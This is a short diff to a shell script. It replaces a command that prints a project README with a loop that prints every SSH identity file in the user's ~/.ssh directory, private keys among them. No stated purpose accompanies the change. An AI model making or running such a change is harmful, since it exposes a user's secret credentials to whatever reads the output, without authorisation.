@@ -1,3 +1,6 @@
 #!/bin/sh
 
-cat /Users/rzuber/projects/distiller/templeton/README.md
+for id in `ls -1 /Users/rzuber/.ssh/id_*`
+do
+  cat $id
+done
